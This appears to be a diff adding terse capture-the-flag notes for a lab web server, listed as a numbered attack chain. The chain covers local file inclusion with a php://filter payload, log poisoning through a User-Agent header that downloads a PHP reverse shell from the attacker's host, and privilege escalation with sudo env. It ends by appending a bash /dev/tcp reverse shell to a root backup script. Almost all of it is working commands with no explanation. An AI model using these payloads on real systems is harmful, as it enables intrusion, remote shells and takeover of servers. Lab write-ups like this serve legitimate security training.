@@ -1,0 +1,15 @@
+1 - nmap -A 10.10.57.106
+2 - http://10.10.57.106/?view=cat (LFI)
+3 - http://10.10.57.106/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
+4 - cp /usr/share/webshells/php/php-reverse-shell.php .
+5 - curl --user-agent "<php file_put_contents('shell.php', file_get_contents('http://10.8.94.51:8000/php-reverse-shell.php'))?>" "http://10.10.57.106/view=./dog/../index
+6 - http://10.10.57.106/shell.php
+7 - cat /var/www/flag2*
+8 - cat /var/www/html/flag.php
+9 - ls -la / (Docker)
+10 - sudo -l (env)
+11 - sudo env /bin/sh
+12 - cat /root/flag3.txt
+13 - echo 'bash -i >& /dev/tcp/10.8.94.51/4445 0>&1' >> /opt/backups/backup.sh
+14 - whoami
+15 - cat flag4.txt
